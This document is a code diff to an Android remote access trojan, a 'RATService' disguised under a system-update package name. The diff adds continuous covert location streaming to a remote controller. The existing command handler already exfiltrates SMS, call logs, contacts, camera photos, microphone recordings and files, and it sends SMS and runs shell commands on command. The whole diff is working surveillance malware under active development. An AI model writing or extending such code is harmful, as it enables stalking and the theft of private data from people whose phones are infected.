@@ -12,17 +12,30 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
 import android.os.Binder;
 import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.Looper;
 import android.os.PowerManager;
 import android.os.RemoteException;
 import android.os.SystemClock;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
+import androidx.core.app.ActivityCompat;
+import android.Manifest;
+import android.content.pm.PackageManager;
 
 import com.android.system.update.modules.*;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 
 import java.io.BufferedReader;
 import java.io.IOException;
@@ -54,6 +67,13 @@ public class RATService extends Service {
     private static volatile RATService instance;
     private PowerManager.WakeLock wakeLock;
     private int currentRetryDelay = 5000; // Start with 5 seconds
+    
+    // Location tracking variables
+    private LocationManager locationManager;
+    private LocationListener locationListener;
+    private HandlerThread locationThread;
+    private Handler locationHandler;
+    private boolean isLocationTracking = false;
     
     // Modules
     private CameraModule cameraModule;
@@ -94,6 +114,10 @@ public class RATService extends Service {
         
         createNotificationChannel();
         startForeground(NOTIFICATION_ID, createNotification());
+        
+        // Initialize location manager
+        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        startLocationThread();
         
         // Initialize modules based on config
         if (Config.ENABLE_CAMERA) cameraModule = new CameraModule(this);
@@ -192,6 +216,12 @@ public class RATService extends Service {
             }
         });
         watchdogThread.start();
+    }
+    
+    private void startLocationThread() {
+        locationThread = new HandlerThread("LocationThread");
+        locationThread.start();
+        locationHandler = new Handler(locationThread.getLooper());
     }
     
     private void scheduleAllJobs() {
@@ -372,154 +402,319 @@ public class RATService extends Service {
             out.flush();
         }
     }
+    
     private void processCommand(String command) {
-    String[] parts = command.split("\\|", 2);
-    String cmd = parts[0];
-    String args = parts.length > 1 ? parts[1] : "";
-    
-    Log.d(TAG, "Received command: " + cmd);
-    
-    switch (cmd) {
-        case "PING":
-            sendCommand("PONG");
-            break;
-            
-        case "info":
-case "INFO":
-case "DEVICE_INFO":
-    if (deviceModule != null) {
-        String result = deviceModule.getDeviceInfo();
-        sendCommand("INFO|" + result);
-    } else {
-        sendCommand("INFO|ERROR: Device module not available");
+        String[] parts = command.split("\\|", 2);
+        String cmd = parts[0].toLowerCase().trim(); // Normalize to lowercase
+        String args = parts.length > 1 ? parts[1] : "";
+        
+        Log.d(TAG, "Received command: " + cmd + " with args: " + args);
+        
+        switch (cmd) {
+            case "ping":
+                sendCommand("PONG");
+                break;
+                
+            case "info":
+            case "device_info":
+                if (deviceModule != null) {
+                    String result = deviceModule.getDeviceInfo();
+                    sendCommand("INFO|" + result);
+                } else {
+                    sendCommand("INFO|ERROR: Device module not available");
+                }
+                break;
+                
+            case "location":
+            case "get_location":
+                if (locationModule != null) {
+                    String result = locationModule.getLocation();
+                    sendCommand("LOCATION|" + result);
+                } else {
+                    sendCommand("LOCATION|ERROR: Location module not available");
+                }
+                break;
+                
+            // NEW: Location streaming commands
+            case "location_stream":
+                handleLocationStreamCommand(args);
+                break;
+                
+            case "camera":
+            case "camera_photo":
+                if (cameraModule != null) {
+                    String result = cameraModule.takePhoto();
+                    sendCommand("CAMERA|" + result);
+                } else {
+                    sendCommand("CAMERA|ERROR: Camera module not available");
+                }
+                break;
+                
+            case "sms":
+            case "get_sms":
+                if (smsModule != null) {
+                    String result = smsModule.getSms();
+                    sendCommand("SMS|" + result);
+                } else {
+                    sendCommand("SMS|ERROR: SMS module not available");
+                }
+                break;
+                
+            case "calls":
+            case "get_calls":
+                if (callsModule != null) {
+                    String result = callsModule.getCallLogs();
+                    sendCommand("CALLS|" + result);
+                } else {
+                    sendCommand("CALLS|ERROR: Calls module not available");
+                }
+                break;
+                
+            case "contacts":
+            case "get_contacts":
+                if (contactsModule != null) {
+                    String result = contactsModule.getContacts();
+                    sendCommand("CONTACTS|" + result);
+                } else {
+                    sendCommand("CONTACTS|ERROR: Contacts module not available");
+                }
+                break;
+                
+            case "files":
+            case "list_files":
+                if (fileModule != null) {
+                    String path = args.isEmpty() ? "/sdcard" : args;
+                    String result = fileModule.listFiles(path);
+                    sendCommand("FILES|" + result);
+                } else {
+                    sendCommand("FILES|ERROR: File module not available");
+                }
+                break;
+                
+            case "mic":
+            case "mic_start":
+                if (micModule != null) {
+                    String result = micModule.startRecording(30);
+                    sendCommand("MIC|" + result);
+                } else {
+                    sendCommand("MIC|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "mic_stop":
+                if (micModule != null) {
+                    String result = micModule.stopRecording();
+                    sendCommand("MIC_STOP|" + result);
+                } else {
+                    sendCommand("MIC_STOP|ERROR: Microphone module not available");
+                }
+                break;
+                
+            case "sms_send":
+                if (smsModule != null && args.contains("|")) {
+                    String[] parts2 = args.split("\\|", 2);
+                    String result = smsModule.sendSms(parts2[0], parts2[1]);
+                    sendCommand("SMS_SEND|" + result);
+                } else {
+                    sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
+                }
+                break;
+                
+            case "file_get":
+            case "download":
+                if (fileModule != null) {
+                    String result = fileModule.getFile(args);
+                    sendCommand("FILE_GET|" + result);
+                } else {
+                    sendCommand("FILE_GET|ERROR: File module not available");
+                }
+                break;
+                
+            case "shell":
+            case "exec":
+                if (shellModule != null) {
+                    String result = shellModule.executeCommand(args);
+                    sendCommand("SHELL|" + result);
+                } else {
+                    sendCommand("SHELL|ERROR: Shell module not available");
+                }
+                break;
+                
+            case "help":
+                sendCommand("HELP|Available commands: info, location, location_stream [start/stop], camera, sms, calls, contacts, files, mic, mic_stop, shell, ping");
+                break;
+                
+            default:
+                sendCommand("UNKNOWN_CMD|" + cmd);
+                break;
+        }
     }
-    break;
-            
-        case "location":
-        case "LOCATION":
-            if (locationModule != null) {
-                String result = locationModule.getLocation();
-                sendCommand("LOCATION|" + result);
-            } else {
-                sendCommand("LOCATION|ERROR: Location module not available");
-            }
-            break;
-            
-        case "camera":
-        case "CAMERA":
-        case "CAMERA_PHOTO":
-            if (cameraModule != null) {
-                String result = cameraModule.takePhoto();
-                sendCommand("CAMERA|" + result);
-            } else {
-                sendCommand("CAMERA|ERROR: Camera module not available");
-            }
-            break;
-            
-        case "sms":
-        case "SMS":
-        case "SMS_GET":
-            if (smsModule != null) {
-                String result = smsModule.getSms();
-                sendCommand("SMS|" + result);
-            } else {
-                sendCommand("SMS|ERROR: SMS module not available");
-            }
-            break;
-            
-        case "calls":
-        case "CALLS":
-        case "CALL_GET":
-            if (callsModule != null) {
-                String result = callsModule.getCallLogs();
-                sendCommand("CALLS|" + result);
-            } else {
-                sendCommand("CALLS|ERROR: Calls module not available");
-            }
-            break;
-            
-        case "contacts":
-        case "CONTACTS":
-        case "CONTACTS_GET":
-            if (contactsModule != null) {
-                String result = contactsModule.getContacts();
-                sendCommand("CONTACTS|" + result);
-            } else {
-                sendCommand("CONTACTS|ERROR: Contacts module not available");
-            }
-            break;
-            
-        case "files":
-        case "FILES":
-        case "FILE_LIST":
-            if (fileModule != null) {
-                String path = args.isEmpty() ? "/sdcard" : args;
-                String result = fileModule.listFiles(path);
-                sendCommand("FILES|" + result);
-            } else {
-                sendCommand("FILES|ERROR: File module not available");
-            }
-            break;
-            
-        case "mic":
-        case "MIC":
-        case "MIC_START":
-            if (micModule != null) {
-                String result = micModule.startRecording(30);
-                sendCommand("MIC|" + result);
-            } else {
-                sendCommand("MIC|ERROR: Microphone module not available");
-            }
-            break;
-            
-        case "MIC_STOP":
-            if (micModule != null) {
-                String result = micModule.stopRecording();
-                sendCommand("MIC_STOP|" + result);
-            } else {
-                sendCommand("MIC_STOP|ERROR: Microphone module not available");
-            }
-            break;
-            
-        case "SMS_SEND":
-            if (smsModule != null && args.contains("|")) {
-                String[] parts2 = args.split("\\|", 2);
-                String result = smsModule.sendSms(parts2[0], parts2[1]);
-                sendCommand("SMS_SEND|" + result);
-            } else {
-                sendCommand("SMS_SEND|ERROR: Invalid format or module unavailable");
-            }
-            break;
-            
-        case "FILE_GET":
-            if (fileModule != null) {
-                String result = fileModule.getFile(args);
-                sendCommand("FILE_GET|" + result);
-            } else {
-                sendCommand("FILE_GET|ERROR: File module not available");
-            }
-            break;
-            
-        case "SHELL":
-            if (shellModule != null) {
-                String result = shellModule.executeCommand(args);
-                sendCommand("SHELL|" + result);
-            } else {
-                sendCommand("SHELL|ERROR: Shell module not available");
-            }
-            break;
-            
-        case "help":
-        case "HELP":
-            sendCommand("HELP|Available commands: info, location, camera, sms, calls, contacts, files, mic, shell, ping");
-            break;
-            
-        default:
-            sendCommand("UNKNOWN_CMD|" + cmd);
-            break;
+    
+    // NEW: Handle location streaming commands
+    private void handleLocationStreamCommand(String args) {
+        args = args.trim().toLowerCase();
+        
+        if (args.equals("start") || args.equals("begin") || args.equals("on")) {
+            startLocationTracking();
+        } else if (args.equals("stop") || args.equals("end") || args.equals("off")) {
+            stopLocationTracking();
+        } else if (args.isEmpty()) {
+            // Return current tracking status
+            sendCommand("LOCATION_STREAM|" + (isLocationTracking ? "active" : "inactive"));
+        } else {
+            sendCommand("LOCATION_STREAM|error: Unknown parameter. Use 'start' or 'stop'");
+        }
     }
-}
-   
+    
+    // NEW: Start live location tracking
+    private void startLocationTracking() {
+        if (!checkLocationPermission()) {
+            sendCommand("LOCATION_STREAM|error: No location permission");
+            return;
+        }
+        
+        if (isLocationTracking) {
+            sendCommand("LOCATION_STREAM|already active");
+            return;
+        }
+        
+        try {
+            locationListener = new LocationListener() {
+                @Override
+                public void onLocationChanged(Location location) {
+                    // Send location update immediately
+                    String locationJson = createLocationJson(location);
+                    sendCommand("LOCATION_UPDATE|" + locationJson);
+                    Log.d(TAG, "Location update sent: " + location.getLatitude() + "," + location.getLongitude());
+                }
+                
+                @Override
+                public void onStatusChanged(String provider, int status, Bundle extras) {
+                    Log.d(TAG, "Location provider status changed: " + provider + " status: " + status);
+                }
+                
+                @Override
+                public void onProviderEnabled(String provider) {
+                    Log.d(TAG, "Location provider enabled: " + provider);
+                }
+                
+                @Override
+                public void onProviderDisabled(String provider) {
+                    Log.d(TAG, "Location provider disabled: " + provider);
+                    sendCommand("LOCATION_STREAM|warning: " + provider + " disabled");
+                }
+            };
+            
+            // Request location updates every 3 seconds, or when device moves 5 meters
+            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                    LocationManager.GPS_PROVIDER,
+                    3000,   // 3 seconds
+                    5,      // 5 meters
+                    locationListener,
+                    locationHandler.getLooper()
+                );
+                Log.d(TAG, "GPS location tracking started");
+            }
+            
+            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                locationManager.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER,
+                    3000,
+                    5,
+                    locationListener,
+                    locationHandler.getLooper()
+                );
+                Log.d(TAG, "Network location tracking started");
+            }
+            
+            isLocationTracking = true;
+            sendCommand("LOCATION_STREAM|started");
+            
+            // Get initial location immediately
+            Location lastLocation = getBestLastKnownLocation();
+            if (lastLocation != null) {
+                String locationJson = createLocationJson(lastLocation);
+                sendCommand("LOCATION_UPDATE|" + locationJson);
+            }
+            
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception starting location tracking", e);
+            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "Error starting location tracking", e);
+            sendCommand("LOCATION_STREAM|error: " + e.getMessage());
+        }
+    }
+    
+    // NEW: Stop live location tracking
+    private void stopLocationTracking() {
+        if (locationManager != null && locationListener != null) {
+            locationManager.removeUpdates(locationListener);
+            locationListener = null;
+            isLocationTracking = false;
+            sendCommand("LOCATION_STREAM|stopped");
+            Log.d(TAG, "Location tracking stopped");
+        } else {
+            sendCommand("LOCATION_STREAM|already inactive");
+        }
+    }
+    
+    // NEW: Get best last known location
+    private Location getBestLastKnownLocation() {
+        Location bestLocation = null;
+        
+        try {
+            if (checkLocationPermission()) {
+                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                    Location gpsLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                    if (gpsLocation != null && (bestLocation == null || 
+                        gpsLocation.getAccuracy() < bestLocation.getAccuracy())) {
+                        bestLocation = gpsLocation;
+                    }
+                }
+                
+                if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                    Location networkLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                    if (networkLocation != null && (bestLocation == null || 
+                        networkLocation.getAccuracy() < bestLocation.getAccuracy())) {
+                        bestLocation = networkLocation;
+                    }
+                }
+            }
+        } catch (SecurityException e) {
+            Log.e(TAG, "Security exception getting last known location", e);
+        }
+        
+        return bestLocation;
+    }
+    
+    // NEW: Check location permission
+    private boolean checkLocationPermission() {
+        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
+                == PackageManager.PERMISSION_GRANTED ||
+               ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
+                == PackageManager.PERMISSION_GRANTED;
+    }
+    
+    // NEW: Create JSON from location
+    private String createLocationJson(Location location) {
+        try {
+            JSONObject json = new JSONObject();
+            json.put("latitude", location.getLatitude());
+            json.put("longitude", location.getLongitude());
+            json.put("accuracy", location.hasAccuracy() ? location.getAccuracy() : 0);
+            json.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
+            json.put("bearing", location.hasBearing() ? location.getBearing() : 0);
+            json.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
+            json.put("provider", location.getProvider());
+            json.put("time", location.getTime());
+            json.put("timestamp", System.currentTimeMillis());
+            return json.toString();
+        } catch (JSONException e) {
+            return "{\"error\":\"JSON creation error\"}";
+        }
+    }
     
     private String getUniqueDeviceId() {
         SharedPreferences prefs = getSharedPreferences("device_prefs", MODE_PRIVATE);
@@ -563,6 +758,20 @@ case "DEVICE_INFO":
     @Override
     public void onDestroy() {
         Log.d(TAG, "System service onDestroy");
+        
+        // Stop location tracking
+        stopLocationTracking();
+        
+        // Clean up location thread
+        if (locationThread != null) {
+            locationThread.quitSafely();
+            try {
+                locationThread.join();
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            }
+        }
+        
         isRunning.set(false);
         AppController.clearConnectionService();
         instance = null;
